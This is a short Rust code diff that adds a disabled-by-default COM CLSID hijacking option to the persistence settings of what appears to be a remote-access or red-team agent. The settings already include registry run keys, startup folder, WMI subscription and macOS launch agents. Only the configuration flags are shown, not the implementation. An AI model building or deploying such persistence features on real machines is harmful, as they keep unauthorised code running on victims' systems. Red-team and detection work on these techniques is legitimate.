@@ -330,6 +330,11 @@ pub struct PersistenceConfig {
     /// Requires PowerShell and WMI access; disable on heavily-locked endpoints.
     #[serde(default = "default_true")]
     pub wmi_subscription: bool,
+    /// COM server CLSID hijack via HKCU\Software\Classes\CLSID (Windows).
+    /// Only effective when the agent is an in-process DLL.  Disabled by
+    /// default to avoid registry noise on endpoints that do not support it.
+    #[serde(default)]
+    pub com_hijacking: bool,
 
     // ── macOS ─────────────────────────────────────────────────────────────────
     /// ~/Library/LaunchAgents plist loaded at user login (macOS).
@@ -365,6 +370,7 @@ impl Default for PersistenceConfig {
             registry_run_key: true,
             startup_folder: true,
             wmi_subscription: true,
+            com_hijacking: false,
             launch_agent: true,
             launch_daemon: true,
             login_item: true,
